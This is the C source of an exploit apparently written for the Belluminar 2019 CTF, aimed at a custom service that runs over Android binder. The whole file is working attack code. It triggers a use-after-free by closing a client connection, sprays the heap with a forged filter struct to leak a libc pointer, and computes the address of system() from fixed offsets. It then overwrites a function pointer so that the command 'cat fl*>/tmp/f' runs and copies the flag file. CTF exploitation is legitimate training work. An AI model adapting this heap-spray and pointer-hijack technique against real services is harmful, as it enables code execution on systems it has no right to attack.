/*
 * Super modern service exploit by d0now
 * for belluminar 2019
 * git : github.com/d0now/2019_belluminar
*/

#include "main.h"
#include "binder.h"

char *command = "cat fl*>/tmp/f";

struct binder_state *bs;

pthread_t client_threads[CLIENT_COUNT];
int client_cmd[CLIENT_COUNT];
void *client_buf;
size_t client_buf_size;

void hexDump(char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char*)addr;

    // Output description if given.
    if (desc != NULL)
        printf("%s:\n", desc);

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf("  %s\n", buff);

            // Output the offset.
            printf("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf(" %02x", pc[i]);

        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
            buff[i % 16] = '.';
        } else {
            buff[i % 16] = pc[i];
        }

        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf("   ");
        i++;
    }

    // And print the final ASCII bit.
    printf("  %s\n", buff);
}

void *client(void *arg) {

    uint64_t client_idx = (uint64_t)arg;

    int sock, connected, addr_len;
    struct sockaddr_in addr;

    int i, cmd, pipes[2];

    if (pipe(pipes)) {
        printf("error: pipe()\n");
        goto err;
    }

    client_cmd[client_idx] = pipes[1];

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("error: socket()\n");
        goto err;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(31447);
    addr_len = sizeof(addr);

    printf("client looping...\n");

    while (true) {

        read(pipes[0], &cmd, sizeof(cmd));
        printf("cmd=%d\n", cmd);
        switch (cmd) {

            case CLIENT_STATE_CONNECT:
                sleep(2);
                connected = 0;
                for (i=0 ; i<3 ; i++) {
                    if (connect(sock, (struct sockaddr *)&addr, addr_len) < 0) {
                        printf("retrying connect...\n");
                        sleep(1);
                        continue;
                    }
                    connected = 1;
                    break;
                }
                if (connected)
                    printf("client connected.\n");
                break;

            case CLIENT_STATE_SEND:
                sleep(1);
                write(sock, &client_buf_size, sizeof(client_buf_size));
                write(sock, client_buf, client_buf_size);
                break;

            case CLIENT_STATE_CLOSE:
                close(sock);
                break;

            default:
                break;
        }
    }

done:
    return NULL;
err:
    return (void*)(-1);
}

int client_order(uint64_t idx, int cmd) {
    if (client_cmd[idx] == 0) return -1;
    return write(client_cmd[idx], &cmd, sizeof(cmd));
}

int connect_server(uint64_t idx) {

    int ret;

    ret = -1;

    if (pthread_create(&client_threads[idx], NULL, client, (void *)idx))
        goto done;

    printf("client thread created.\n");

done:
    return ret;
}

int create_server(uint32_t idx) {

    uint32_t ret;
    uint8_t data[BINDER_MSG_BUF_SIZE];
    struct binder_io msg;
    struct binder_io reply;

    ret = -1;

    bio_init(&msg, data, sizeof(data), 0);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, BINDER_SVC_NAME);

    bio_put_uint32(&msg, idx);

    if (binder_call(bs, &msg, &reply, BINDER_SVC_ID, SVC_CREATE_SERVER)) {
        printf("binder_call() failed.\n");
        goto done;
    }

    ret = bio_get_uint32(&reply);
    binder_done(bs, &reply);

done:
    return ret;
}

int create_client(uint32_t server_idx, uint32_t client_idx) {

    uint32_t ret;
    uint8_t data[BINDER_MSG_BUF_SIZE];
    struct binder_io msg;
    struct binder_io reply;

    ret = -1;

    bio_init(&msg, data, sizeof(data), 0);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, BINDER_SVC_NAME);

    bio_put_uint32(&msg, server_idx);
    bio_put_uint32(&msg, client_idx);

    if (binder_call(bs, &msg, &reply, BINDER_SVC_ID, SVC_CREATE_CLIENT)) {
        printf("binder_call() failed.\n");
        goto done;
    }

    ret = bio_get_uint32(&reply);
    binder_done(bs, &reply);

done:
    return ret;
}

int close_connection(uint32_t idx) {

    uint32_t ret;
    uint8_t data[BINDER_MSG_BUF_SIZE];
    struct binder_io msg;
    struct binder_io reply;

    ret = -1;

    bio_init(&msg, data, sizeof(data), 0);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, BINDER_SVC_NAME);

    bio_put_uint32(&msg, idx);

    if (binder_call(bs, &msg, &reply, BINDER_SVC_ID, SVC_CLOSE)) {
        printf("binder_call() failed.\n");
        goto done;
    }

    ret = bio_get_uint32(&reply);
    binder_done(bs, &reply);

done:
    return ret;
}

int create_filter(uint32_t idx, const char *filter_ip, const char *filter_desc) {

    uint32_t ret;
    uint8_t data[BINDER_MSG_BUF_SIZE];
    struct binder_io msg;
    struct binder_io reply;

    ret = -1;

    bio_init(&msg, data, sizeof(data), 0);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, BINDER_SVC_NAME);

    bio_put_uint32(&msg, idx);
    bio_put_string16_x(&msg, filter_ip);
    bio_put_string16_x(&msg, filter_desc);

    if (binder_call(bs, &msg, &reply, BINDER_SVC_ID, SVC_CREATE_FILTER)) {
        printf("binder_call() failed.\n");
        goto done;
    }

    ret = bio_get_uint32(&reply);
    binder_done(bs, &reply);

done:
    return ret;
}

int delete_filter(uint32_t idx, const char *filter_ip) {

    uint32_t ret;
    uint8_t data[BINDER_MSG_BUF_SIZE];
    struct binder_io msg;
    struct binder_io reply;

    ret = -1;

    bio_init(&msg, data, sizeof(data), 0);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, BINDER_SVC_NAME);

    bio_put_uint32(&msg, idx);
    bio_put_string16_x(&msg, filter_ip);

    if (binder_call(bs, &msg, &reply, BINDER_SVC_ID, SVC_DELETE_FILTER)) {
        printf("binder_call() failed.\n");
        goto done;
    }

    ret = bio_get_uint32(&reply);
    binder_done(bs, &reply);

done:
    return ret;
}

int filter_edit_desc(uint32_t idx, const char *filter_ip, const char *filter_desc) {

    uint32_t ret;
    uint8_t data[BINDER_MSG_BUF_SIZE];
    struct binder_io msg;
    struct binder_io reply;

    ret = -1;

    bio_init(&msg, data, sizeof(data), 0);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, BINDER_SVC_NAME);

    bio_put_uint32(&msg, idx);
    bio_put_string16_x(&msg, filter_ip);
    bio_put_string16_x(&msg, filter_desc);

    if (binder_call(bs, &msg, &reply, BINDER_SVC_ID, SVC_FILTER_EDIT_DESC)) {
        printf("binder_call() failed.\n");
        goto done;
    }

    ret = bio_get_uint32(&reply);
    binder_done(bs, &reply);

done:
    return ret;
}

int filter_dump_desc(uint32_t idx, const char *filter_ip, char *filter_desc) {

    uint32_t ret;
    uint8_t data[BINDER_MSG_BUF_SIZE];
    struct binder_io msg;
    struct binder_io reply;

    int i;
    size_t len;
    uint16_t *str;

    ret = -1;

    bio_init(&msg, data, sizeof(data), 0);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, BINDER_SVC_NAME);

    bio_put_uint32(&msg, idx);
    bio_put_string16_x(&msg, filter_ip);

    if (binder_call(bs, &msg, &reply, BINDER_SVC_ID, SVC_FILTER_DUMP_DESC)) {
        printf("binder_call() failed.\n");
        goto done;
    }

    ret = bio_get_uint32(&reply);
    str = bio_get_string16(&reply, &len);
    for (i=0 ; i<len ; i++)
        filter_desc[i] = (char)str[i];
    binder_done(bs, &reply);

done:
    return ret;
}

int client_recv(uint32_t idx, void *ptr, size_t *len) {

    int ret;

    uint8_t data[BINDER_MSG_BUF_SIZE];
    struct binder_io msg;
    struct binder_io reply;

    void *buf;

    ret = -1;

    bio_init(&msg, data, sizeof(data), 0);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, BINDER_SVC_NAME);

    bio_put_uint32(&msg, idx);

    if (binder_call(bs, &msg, &reply, BINDER_SVC_ID, SVC_CLIENT_RECV)) {
        printf("binder_call() failed.\n");
        goto done;
    }

    ret = bio_get_uint32(&reply);
    *len = bio_get_uint32(&reply);
    buf = bio_get(&reply, *len);
    memcpy(ptr, buf, *len);
    binder_done(bs, &reply);

done:
    return ret;
}

int client_send(uint32_t idx, void *ptr, size_t len) {

    int ret;

    uint8_t data[BINDER_MSG_BUF_SIZE];
    struct binder_io msg;
    struct binder_io reply;

    void *buf;

    ret = -1;

    bio_init(&msg, data, sizeof(data), 0);
    bio_put_uint32(&msg, 0);
    bio_put_string16_x(&msg, BINDER_SVC_NAME);

    bio_put_uint32(&msg, idx);
    bio_put_uint32(&msg, len);
    if ((buf = bio_alloc(&msg, len)) == NULL) {
        printf("bio_alloc failed.\n");
        goto done;
    }
    memcpy(buf, ptr, len);

    if (binder_call(bs, &msg, &reply, BINDER_SVC_ID, SVC_CLIENT_SEND)) {
        printf("binder_call() failed.\n");
        goto done;
    }

    ret = bio_get_uint32(&reply);
    binder_done(bs, &reply);

done:
    return ret;
}

int main(int argc, const char *argv[], const char *envp[]) {

    int i;
    char buf[256];
    void *data;
    size_t len;

    struct filter *overwr;

    printf("Exploiting start.\n");

    bs = binder_open("/dev/binder", 128*1024);
    if (bs == NULL) {
        printf("error: binder_open()\n");
        goto err;
    }

    printf("** 1. Creating server & filter.\n");
    create_server(0);
    create_filter(0, "1.2.3.4", "Hello, world!");

    printf("** 2. Connect spray client.\n");
    connect_server(0);
    for (i=0 ; i<10 ; i++) {
        while (client_order(0, CLIENT_STATE_CONNECT) == -1);
        if (!create_client(0, 1))
            break;
        sleep(1);
    }

    sleep(3);

    printf("** 3. Connect uaf client.\n");
    connect_server(1);
    for (i=0 ; i<10 ; i++) {
        while (client_order(1, CLIENT_STATE_CONNECT) == -1);
        if (!create_client(0, 2))
            break;
        sleep(1);
    }

    printf("** 4. Trigger uaf by close connection.\n");
    close_connection(2);
    client_order(1, CLIENT_STATE_CLOSE);
    client_order(0, CLIENT_STATE_CLOSE);

    printf("** 5. Heap spray.\n");
    overwr = malloc(sizeof(*overwr));
    len = sizeof(*overwr);
    overwr->next = (struct filter *)0x6060d8;
    overwr->prev = NULL;
    overwr->addr.sin_addr.s_addr = inet_addr("1.2.3.4");
    overwr->refcount = 1;
    client_send(1, overwr, len);
    sleep(1);
    memset(buf, 0, sizeof(buf));
    filter_dump_desc(0, "0.0.0.0", buf);
    hexDump("buf", buf, sizeof(buf));
    delete_filter(1, "1.2.3.4");

    uint64_t system = *(uint64_t *)buf - 0x122ec0 + 0x4f440;

    printf("** 6. Exploit.\n");
    overwr = malloc(sizeof(*overwr));
    len = sizeof(*overwr);
    memset(overwr, 'A', sizeof(overwr));
    overwr->next = (struct filter *)0x606010;
    overwr->prev = NULL;
    overwr->addr.sin_addr.s_addr = inet_addr("1.2.3.4");
    overwr->refcount = 1;
    client_send(0, overwr, len);
    sleep(1);
    memset(buf, 'A', sizeof(buf));
    strcpy(buf, command);
    buf[strlen(command)]=';';
    *(uint64_t *)(buf+16) = system;
    filter_edit_desc(0, "0.0.0.0", buf);
    filter_dump_desc(0, "1.2.3.4", buf);

done:
    printf("done.\n");
    return 0;
err:
    printf("Exploit failed...\n");
    return -1;
}